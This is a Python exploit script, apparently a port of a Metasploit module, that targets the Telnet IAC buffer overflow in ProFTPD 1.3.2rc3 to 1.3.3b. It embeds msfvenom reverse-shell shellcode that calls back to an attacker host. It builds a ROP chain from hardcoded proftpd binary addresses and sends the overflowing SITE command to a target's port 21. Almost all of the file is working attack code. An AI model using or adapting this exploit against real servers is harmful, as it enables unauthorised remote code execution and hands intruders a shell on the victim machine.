#!/usr/bin/python

import sys,os,socket
import struct


#this is a port of the metasploit module: exploit/linux/ftp/proftp_telnet_iac
#ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.xxx LPORT=666 CMD=/bin/sh PrependChrootBreak=true --smallest -f python -v payload -b '\x09\x0a\x0b\x0c\x0d\x20\xff'

payload =  ""
payload += "\x6a\x1d\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
payload += "\x13\x1a\xfe\xbe\x56\x83\xeb\xfc\xe2\xf4\x2b\x37"
payload += "\x8f\x8d\x70\xb8\xe6\x9b\x9a\x94\x83\xdf\xf9\x94"
payload += "\x99\x0e\xd7\x7e\x37\x8f\x42\x33\x3e\x67\xda\xae"
payload += "\xd8\x3e\x34\xd0\x37\xb5\x70\xc3\xe7\xe6\x16\x33"
payload += "\x3e\xb4\xe0\x94\x83\xdf\xc3\xa6\x73\xd6\x2b\x25"
payload += "\x49\xb5\x49\xbd\xed\x3c\x18\x77\x5f\xe6\x7c\x33"
payload += "\x3e\xc5\x43\x4e\x81\x9b\x9a\xb7\xc7\xaf\x72\xf4"
payload += "\xb5\x56\xbd\x96\xbc\x56\x18\x64\x37\xb7\xaa\x98"
payload += "\xee\x07\x49\x4d\xbd\xdf\xfb\x33\x3e\x04\x72\x90"
payload += "\x91\x25\x72\x96\x91\x79\x78\x97\x37\xb5\x48\xad"
payload += "\x37\xb7\xaa\xf5\x73\xd6"

# NOTE: All addresses are from the proftpd binary
IACCount = 4096+16
Offset = 0x102c-4
Ret = "0x805a547" 	# pop esi / pop ebp / ret
Writable = "0x80e81a0"  # .data

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

rop = struct.pack("<L",0xcccccccc) # unused
rop += struct.pack("<L",0x805a544)  # mov eax,esi / pop ebx / pop esi / pop ebp / ret
rop += struct.pack("<L",0xcccccccc) # becomes ebx
rop += struct.pack("<L",0xcccccccc) # becomes esi
rop += struct.pack("<L",0xcccccccc) # becomes ebp
# quadruple deref the res pointer :)
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
rop += struct.pack("<L",0x8068886)  # mov eax,[eax] / ret
# skip the pool chunk header
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
rop += struct.pack("<L",0x805bd8e)  # inc eax / adc cl, cl / ret
# execute the data :)
rop += struct.pack("<L",0x0805c26c) # jmp eax

buf = ''
buf += 'SITE '

buf += payload
if len(buf) % 2 == 0:
	buf += "B" 	
        print "Buffer was aligned"

buf += "\xff" * (IACCount - len(payload))
buf +="\x90" * (Offset - len(buf))
addrs = struct.pack('<L',0x805a547) #Ret
addrs +=struct.pack('<L',0x80e81a0) #Writable
addrs +=rop
buf += addrs
buf += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(buf)
print "Payload send...coming to a laptop near you"
data=s.recv(1024)
print data
s.close()
